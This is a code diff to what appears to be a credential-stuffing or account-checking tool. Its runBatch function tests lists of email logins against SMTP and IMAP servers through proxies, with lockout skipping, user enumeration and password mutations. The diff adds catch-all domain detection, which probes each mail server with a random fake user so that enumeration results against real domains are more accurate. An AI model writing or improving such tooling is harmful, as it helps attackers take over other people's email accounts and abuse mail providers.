@@ -473,6 +473,34 @@ export async function runBatch(creds, seeds = [], opts = {}, onProgress) {
         const retryOpts = result.proxyFallback ? { ...opts, proxy: null, proxyProvider: undefined } : attemptOpts;
         result = await testOne(cred, index, seeds, retryOpts, smtp, imap, ctx);
       }
+      // Catch-all detection: before testing this domain, run a probe against
+      // a random fake user. If the server accepts it, mark domain as catch-all
+      // and skip all SMTP testing for it (results are meaningless).
+      const _domain = (cred.user || '').split('@')[1];
+      if (_domain && !catchAllDomains.has(_domain) && !result.lockSkipped && result.status === 'dead' && result.deadReason === 'auth') {
+        try {
+          const probeRes = await enumerateUser(
+            { user: 'catchall-probe-' + Date.now() + '@' + _domain, pass: 'x' },
+            { host: result.usedHost || cred.host, port: 25, timeout: 2500 }
+          );
+          if (probeRes.exists === true) {
+            catchAllDomains.add(_domain);
+            result.catchAll = true;
+            result.reason = 'catch-all domain detected (' + _domain + ') — SMTP results unreliable';
+            results[index] = result;
+            if (onProgress) await onProgress(result, index);
+            continue;
+          }
+        } catch { /* probe best-effort */ }
+      }
+      if (_domain && catchAllDomains.has(_domain)) {
+        result.catchAll = true;
+        result.reason = 'skipped: domain is catch-all';
+        results[index] = result;
+        if (onProgress) await onProgress(result, index);
+        continue;
+      }
+
       // SMTP User Enumeration & Smart Mutations (after proxy retries, before saving result)
       if (result.status === 'dead' && result.deadReason === 'auth' && !result.lockSkipped) {
         
@@ -532,6 +560,8 @@ export async function runBatch(creds, seeds = [], opts = {}, onProgress) {
   // is unknown, so start the full pool and let short streams drain quickly.
   // Adaptive pacing: track per-host delays
   const hostDelays = new Map();
+  // Catch-all detection: domains whose mail server accepts any user
+  const catchAllDomains = new Set();
   
     const workerCount = streaming ? concurrency : Math.min(concurrency, creds.length);
   const workers = Array.from({ length: workerCount }, () => worker());
